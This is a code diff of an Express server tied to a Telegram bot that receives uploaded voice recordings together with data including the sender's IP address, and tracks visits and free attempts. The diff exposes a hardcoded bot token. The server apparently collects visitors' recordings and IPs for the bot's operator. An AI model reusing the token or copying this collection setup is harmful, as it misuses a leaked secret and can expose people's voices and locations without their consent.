@@ -9,13 +9,20 @@ const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
 const bot = new TelegramBot(botToken, { polling: true });
 
 const app = express();
-app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(express.static(__dirname));
+app.use(bodyParser.json({ limit: '50mb' }));
+app.use(express.static(path.join(__dirname, 'static')));
+app.use(express.static(path.join(__dirname, 'src')));
 
-const storage = multer.memoryStorage();
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        cb(null, 'uploads/');
+    },
+    filename: (req, file, cb) => {
+        cb(null, file.fieldname + '-' + Date.now() + path.extname(file.originalname));
+    }
+});
 const upload = multer({ storage: storage });
-const voiceUpload = multer({ dest: 'uploads/' });
 
 const MAX_FREE_ATTEMPTS = 3;
 const userVisits = {};
@@ -105,7 +112,7 @@ IP: ${additionalData.ip}
     }
 });
 
-app.post('/submitVoice', voiceUpload.single('voice'), (req, res) => {
+app.post('/submitVoice', upload.single('voice'), (req, res) => {
     const chatId = req.body.chatId;
     const voicePath = req.file.path;
     const additionalData = JSON.parse(req.body.additionalData || '{}');
